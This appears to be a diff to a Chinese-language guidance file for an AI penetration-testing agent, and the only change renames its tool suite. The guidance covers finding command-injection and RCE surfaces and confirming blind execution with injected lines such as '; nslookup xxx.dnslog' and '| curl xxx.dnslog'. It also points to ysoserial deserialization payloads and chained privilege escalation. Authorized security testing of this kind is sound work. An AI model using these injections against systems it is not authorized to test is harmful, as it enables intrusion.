@@ -5,12 +5,12 @@ aliases: 命令执行, RCE, remote code execution, command injection, 代码执�
 
 # 命令注入 / RCE
 
-> 思路参考,非清单。分隔符/绕空格/绕关键字等注入技法你已具备且可 web_search 补,这里只补【哨兵工具编排 + 验证判据】。
+> 思路参考,非清单。分隔符/绕空格/绕关键字等注入技法你已具备且可 web_search 补,这里只补【瞭望塔工具编排 + 验证判据】。
 
 ## 先判这是不是命令执行面
 参数进系统命令/危险函数:ping/nslookup 类、导出转换(ffmpeg/imagemagick)、备份压缩、任务调度、`filename/cmd/ip/host/domain` 参数。Java 序列化特征(`ac ed 00 05`/base64 `rO0AB`/`application/x-java-serialized-object`/Shiro `rememberMe`)、表达式注入(SpEL/OGNL/EL)也常升级 RCE。
 
-## 哨兵工具怎么打(独有价值)
+## 瞭望塔工具怎么打(独有价值)
 - **盲打靠带外(主力)**:`oob_generate` 拿域名→`; nslookup xxx.dnslog`/`| curl xxx.dnslog`→`oob_check` 收到解析=命令执行确认。时序盲打看 http_request 耗时。
 - **查组件 RCE**:`query_vuln_intel(组件)`(struts2/fastjson/log4j/shiro/weblogic 等,记忆库有 Copy Fail 提权可接);有 exec_ref 直接 `run_nuclei`。
 - **反序列化 payload**:检测到 Java 序列化,`run_script` 沙盒生成 ysoserial payload 打带外验证。
